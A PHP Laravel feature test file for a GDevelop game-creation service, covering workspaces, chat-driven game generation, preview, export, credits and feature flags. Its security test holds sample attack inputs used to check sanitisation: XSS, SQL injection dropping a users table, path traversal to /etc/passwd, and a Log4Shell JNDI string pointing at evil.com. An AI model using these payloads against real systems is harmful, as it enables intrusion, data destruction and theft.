<?php

namespace Tests\Feature;

use App\Models\User;
use App\Models\Company;
use App\Models\Workspace;
use App\Models\GDevelopGameSession;
use App\Services\FeatureFlagService;
use App\Services\GDevelopGameService;
use App\Services\GDevelopRuntimeService;
use App\Services\GDevelopPreviewService;
use App\Services\GDevelopExportService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class GDevelopFinalIntegrationTest extends TestCase
{
    use RefreshDatabase;

    protected User $user;
    protected Company $company;
    protected Workspace $workspace;
    protected FeatureFlagService $featureFlagService;

    protected function setUp(): void
    {
        parent::setUp();

        // Enable GDevelop for testing
        Config::set('gdevelop.enabled', true);
        Config::set('gdevelop.engines.gdevelop_enabled', true);
        Config::set('gdevelop.engines.playcanvas_enabled', false);

        // Create test user and company with credits
        $this->company = Company::factory()->create([
            'credits' => 1000
        ]);

        $this->user = User::factory()->create([
            'current_company_id' => $this->company->id
        ]);

        $this->company->users()->attach($this->user->id, ['role' => 'owner']);

        // Create GDevelop workspace
        $this->workspace = Workspace::factory()->create([
            'company_id' => $this->company->id,
            'created_by' => $this->user->id,
            'engine_type' => 'gdevelop',
            'name' => 'Test GDevelop Workspace',
            'status' => 'active'
        ]);

        $this->featureFlagService = app(FeatureFlagService::class);

        // Setup storage directories
        Storage::fake('local');
        $this->setupGDevelopDirectories();
    }

    protected function setupGDevelopDirectories(): void
    {
        $directories = [
            'gdevelop/sessions',
            'gdevelop/templates',
            'gdevelop/exports',
            'gdevelop/previews'
        ];

        foreach ($directories as $dir) {
            Storage::makeDirectory($dir);
        }
    }

    /** @test */
    public function test_complete_user_workflow_from_workspace_creation_to_game_export()
    {
        // Step 1: Verify GDevelop is enabled and configured
        $this->assertTrue($this->featureFlagService->isGDevelopEnabled());
        $this->assertFalse($this->featureFlagService->isPlayCanvasEnabled());
        $this->assertEquals('gdevelop', $this->featureFlagService->getPrimaryEngine());

        // Step 2: Test workspace creation with GDevelop engine
        $this->actingAs($this->user);
        
        $workspaceResponse = $this->postJson('/api/workspaces', [
            'name' => 'Integration Test Workspace',
            'engine_type' => 'gdevelop',
            'description' => 'Test workspace for final integration'
        ]);

        $workspaceResponse->assertStatus(201);
        $workspaceData = $workspaceResponse->json('data');
        $this->assertEquals('gdevelop', $workspaceData['engine_type']);

        // Step 3: Test game creation through chat
        $sessionId = 'test-session-' . uniqid();
        
        $chatResponse = $this->postJson('/api/gdevelop/chat', [
            'session_id' => $sessionId,
            'workspace_id' => $this->workspace->id,
            'message' => 'Create a simple platformer game with a player character that can jump and move left/right'
        ]);

        $chatResponse->assertStatus(200);
        $chatData = $chatResponse->json();
        
        $this->assertTrue($chatData['success']);
        $this->assertEquals($sessionId, $chatData['session_id']);
        $this->assertArrayHasKey('game_data', $chatData);
        $this->assertArrayHasKey('preview_url', $chatData);
        $this->assertArrayHasKey('actions', $chatData);

        // Verify game session was created
        $gameSession = GDevelopGameSession::where('session_id', $sessionId)->first();
        $this->assertNotNull($gameSession);
        $this->assertEquals($this->workspace->id, $gameSession->workspace_id);
        $this->assertEquals($this->user->id, $gameSession->user_id);

        // Step 4: Test game modification through chat
        $modifyResponse = $this->postJson('/api/gdevelop/chat', [
            'session_id' => $sessionId,
            'workspace_id' => $this->workspace->id,
            'message' => 'Add enemies that move from left to right and respawn when they reach the edge'
        ]);

        $modifyResponse->assertStatus(200);
        $modifyData = $modifyResponse->json();
        
        $this->assertTrue($modifyData['success']);
        $this->assertEquals($sessionId, $modifyData['session_id']);

        // Verify game was modified (version should increment)
        $updatedSession = GDevelopGameSession::where('session_id', $sessionId)->first();
        $this->assertGreaterThan($gameSession->version, $updatedSession->version);

        // Step 5: Test preview generation
        $previewResponse = $this->getJson("/api/gdevelop/preview/{$sessionId}");
        
        $previewResponse->assertStatus(200);
        $previewData = $previewResponse->json();
        
        $this->assertTrue($previewData['success']);
        $this->assertArrayHasKey('preview_url', $previewData);
        $this->assertArrayHasKey('build_time', $previewData);

        // Step 6: Test export functionality
        $exportResponse = $this->postJson("/api/gdevelop/export/{$sessionId}", [
            'includeAssets' => true,
            'optimizeForMobile' => false,
            'compressionLevel' => 'standard'
        ]);

        $exportResponse->assertStatus(200);
        $exportData = $exportResponse->json();
        
        $this->assertTrue($exportData['success']);
        $this->assertArrayHasKey('export_id', $exportData);

        // Step 7: Test export status and download
        $exportId = $exportData['export_id'];
        
        $statusResponse = $this->getJson("/api/gdevelop/export/{$sessionId}/status");
        $statusResponse->assertStatus(200);
        
        $statusData = $statusResponse->json();
        $this->assertTrue($statusData['success']);
        $this->assertArrayHasKey('status', $statusData);

        // Step 8: Verify credits were deducted
        $this->company->refresh();
        $this->assertLessThan(1000, $this->company->credits);

        // Step 9: Test session cleanup
        $deleteResponse = $this->deleteJson("/api/gdevelop/session/{$sessionId}");
        $deleteResponse->assertStatus(200);
        
        $this->assertNull(GDevelopGameSession::where('session_id', $sessionId)->first());
    }

    /** @test */
    public function test_mobile_optimization_workflow()
    {
        $this->actingAs($this->user);
        
        $sessionId = 'mobile-test-' . uniqid();
        
        // Create mobile-optimized game
        $response = $this->postJson('/api/gdevelop/chat', [
            'session_id' => $sessionId,
            'workspace_id' => $this->workspace->id,
            'message' => 'Create a mobile-friendly puzzle game with touch controls',
            'options' => [
                'mobile_optimized' => true,
                'target_device' => 'mobile',
                'control_scheme' => 'touch_direct',
                'orientation' => 'portrait'
            ]
        ]);

        $response->assertStatus(200);
        $data = $response->json();
        
        $this->assertTrue($data['success']);
        
        // Verify mobile optimization was applied
        $gameSession = GDevelopGameSession::where('session_id', $sessionId)->first();
        $gameJson = $gameSession->game_json;
        
        // Check for mobile-specific properties
        $this->assertArrayHasKey('properties', $gameJson);
        $this->assertEquals('portrait', $gameJson['properties']['orientation'] ?? 'default');
    }

    /** @test */
    public function test_cross_browser_compatibility()
    {
        $this->actingAs($this->user);
        
        $sessionId = 'browser-test-' . uniqid();
        
        // Create game
        $this->postJson('/api/gdevelop/chat', [
            'session_id' => $sessionId,
            'workspace_id' => $this->workspace->id,
            'message' => 'Create a simple arcade game'
        ]);

        // Test preview with different user agents
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ];

        foreach ($userAgents as $userAgent) {
            $response = $this->withHeaders(['User-Agent' => $userAgent])
                ->getJson("/api/gdevelop/preview/{$sessionId}");
            
            $response->assertStatus(200);
            $data = $response->json();
            $this->assertTrue($data['success']);
        }
    }

    /** @test */
    public function test_performance_validation()
    {
        $this->actingAs($this->user);
        
        $sessionId = 'performance-test-' . uniqid();
        
        // Measure game creation performance
        $startTime = microtime(true);
        
        $response = $this->postJson('/api/gdevelop/chat', [
            'session_id' => $sessionId,
            'workspace_id' => $this->workspace->id,
            'message' => 'Create a complex tower defense game with multiple tower types and enemy waves'
        ]);
        
        $creationTime = microtime(true) - $startTime;
        
        $response->assertStatus(200);
        $this->assertLessThan(30, $creationTime, 'Game creation should complete within 30 seconds');

        // Measure preview generation performance
        $startTime = microtime(true);
        
        $previewResponse = $this->getJson("/api/gdevelop/preview/{$sessionId}");
        
        $previewTime = microtime(true) - $startTime;
        
        $previewResponse->assertStatus(200);
        $this->assertLessThan(10, $previewTime, 'Preview generation should complete within 10 seconds');

        // Check build time from response
        $previewData = $previewResponse->json();
        if (isset($previewData['build_time'])) {
            $this->assertLessThan(5000, $previewData['build_time'], 'Build time should be under 5 seconds');
        }
    }

    /** @test */
    public function test_security_validation()
    {
        $this->actingAs($this->user);
        
        $sessionId = 'security-test-' . uniqid();
        
        // Test malicious input handling
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            '"; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            'javascript:alert(1)'
        ];

        foreach ($maliciousInputs as $input) {
            $response = $this->postJson('/api/gdevelop/chat', [
                'session_id' => $sessionId,
                'workspace_id' => $this->workspace->id,
                'message' => "Create a game with {$input}"
            ]);

            // Should either succeed with sanitized input or fail gracefully
            $this->assertContains($response->getStatusCode(), [200, 422, 400]);
            
            if ($response->getStatusCode() === 200) {
                $data = $response->json();
                $this->assertTrue($data['success']);
                
                // Verify malicious content was sanitized
                $gameSession = GDevelopGameSession::where('session_id', $sessionId)->first();
                if ($gameSession) {
                    $gameJson = json_encode($gameSession->game_json);
                    $this->assertStringNotContainsString('<script>', $gameJson);
                    $this->assertStringNotContainsString('DROP TABLE', $gameJson);
                    $this->assertStringNotContainsString('javascript:', $gameJson);
                }
            }
        }
    }

    /** @test */
    public function test_error_handling_and_recovery()
    {
        $this->actingAs($this->user);
        
        // Test with insufficient credits
        $this->company->update(['credits' => 1]);
        
        $response = $this->postJson('/api/gdevelop/chat', [
            'session_id' => 'insufficient-credits-test',
            'workspace_id' => $this->workspace->id,
            'message' => 'Create a very complex RPG game with multiple systems'
        ]);

        $response->assertStatus(402);
        $data = $response->json();
        $this->assertFalse($data['success']);
        $this->assertStringContainsString('Insufficient credits', $data['error']);

        // Restore credits and test invalid session
        $this->company->update(['credits' => 1000]);
        
        $invalidResponse = $this->getJson('/api/gdevelop/preview/invalid-session-id');
        $invalidResponse->assertStatus(404);
        
        // Test with disabled GDevelop
        Config::set('gdevelop.enabled', false);
        
        $disabledResponse = $this->postJson('/api/gdevelop/chat', [
            'session_id' => 'disabled-test',
            'workspace_id' => $this->workspace->id,
            'message' => 'Create a game'
        ]);

        $disabledResponse->assertStatus(503);
    }

    /** @test */
    public function test_feature_flag_integration()
    {
        // Test feature flag service
        $this->assertTrue($this->featureFlagService->isGDevelopEnabled());
        $this->assertFalse($this->featureFlagService->isPlayCanvasEnabled());
        
        $enabledEngines = $this->featureFlagService->getEnabledEngines();
        $this->assertContains('gdevelop', $enabledEngines);
        $this->assertNotContains('playcanvas', $enabledEngines);
        
        $configSummary = $this->featureFlagService->getEngineConfigurationSummary();
        $this->assertTrue($configSummary['gdevelop']['enabled']);
        $this->assertFalse($configSummary['playcanvas']['enabled']);
        $this->assertEquals('gdevelop', $configSummary['primary_engine']);
        
        // Test configuration validation
        $validation = $this->featureFlagService->validateEngineConfiguration();
        $this->assertTrue($validation['valid']);
        $this->assertEmpty($validation['issues']);
    }

    /** @test */
    public function test_workspace_engine_selection_integration()
    {
        $this->actingAs($this->user);
        
        // Test creating workspace with GDevelop engine
        $response = $this->postJson('/api/workspaces', [
            'name' => 'GDevelop Integration Test',
            'engine_type' => 'gdevelop',
            'description' => 'Testing GDevelop engine selection'
        ]);

        $response->assertStatus(201);
        $data = $response->json('data');
        
        $this->assertEquals('gdevelop', $data['engine_type']);
        $this->assertEquals('GDevelop Integration Test', $data['name']);
        
        // Verify workspace was created with correct engine
        $workspace = Workspace::find($data['id']);
        $this->assertEquals('gdevelop', $workspace->engine_type);
        $this->assertEquals($this->company->id, $workspace->company_id);
    }

    protected function tearDown(): void
    {
        // Clean up any test files
        Storage::deleteDirectory('gdevelop');
        
        parent::tearDown();
    }
}